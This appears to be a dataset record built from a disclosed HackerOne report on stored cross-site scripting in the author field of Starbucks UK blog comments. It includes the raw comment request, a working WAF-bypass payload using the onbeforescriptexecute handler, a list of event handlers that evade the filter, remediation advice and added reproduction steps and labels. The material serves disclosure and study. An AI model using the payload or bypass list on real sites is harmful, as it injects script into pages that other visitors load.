@@ -1,0 +1,49 @@
+{
+    "reported_to": "Starbucks",
+    "reported_by": "bayotop ",
+    "title": "Stored XSS in comments on https://www.starbucks.co.uk/blog/*",
+    "content": "\nHi,\nthere are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork site:www.starbucks.co.uk inurl:blog/. Notice the comments functionality at the bottom at the page.\nWhen a comment is sent the following request is made:\nCode 569 Bytes\n1POST /blog/addcomment HTTP/1.1\n2Host: www.starbucks.co.uk\n3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\n4Accept: text/html, */*; q=0.01\n5Accept-Language: en-US,en;q=0.5\n6X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\n7Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n8X-Requested-With: XMLHttpRequest\n9Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\n10Content-Length: 321\n11Cookie: [redacted]\n12Connection: close\n13\n14Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com\nThe values of the Body and author parameters will be rendered into the page as a new comment. The value from the author parameter is not correctly encoded. This allows to inject arbitrary valid HTML.\nYou seem to be using a WAF which will block request (500) containing <script></script> and various input matching on*=. However, I managed to find a bypass:\nCode 87 Bytes\n1</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>\nThis will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nNote that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).\nHere is a list of all potential on*= events I could find, that will bypass your WAF an can be used to create cross-browser payloads:\nCode 186 Bytes\n1onsearch\n2onwebkitanimationiteration\n3onwebkitanimationstart\n4onanimationiteration\n5onwebkitanimationend\n6onanimationstart\n7ondataavailable\n8ontransitionend\n9onanimationend\n10onreceived\n11onpopstate\nTo fix this issue make sure the author value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.\nPlease let me know in case you need any more information from my side.\n\n",
+    "severity": [
+        7.3,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1498597980,
+    "report_url": "https://hackerone.com/reports/218226",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Navigate to a Starbucks blog post (e.g., https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability)"
+        ],
+        [
+            2,
+            "Submit a comment with a malicious payload in the 'author' parameter, such as: </li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>"
+        ],
+        [
+            3,
+            "Observe that the payload executes when the page is reloaded or viewed by another user"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a stored Cross-Site Scripting (XSS) in the comments section of Starbucks' blog posts. The 'author' parameter in the comment submission is not properly sanitized, allowing an attacker to inject arbitrary HTML and JavaScript. The attack bypasses the WAF by using less common event handlers like 'onbeforescriptexecute'.",
+    "reason": "The vulnerability involves understanding the comment submission process, identifying an unsanitized input field, and crafting a payload that bypasses the WAF. While the core XSS is straightforward, the WAF bypass adds a layer of complexity by requiring knowledge of less common event handlers.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The Stored XSS vulnerability involves injecting malicious scripts through user input (author parameter) in comments, which is a client-side issue rather than an authentication or authorization boundary being crossed. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, which does not apply to XSS vulnerabilities.",
+        "is_detectable": false
+    }
+}
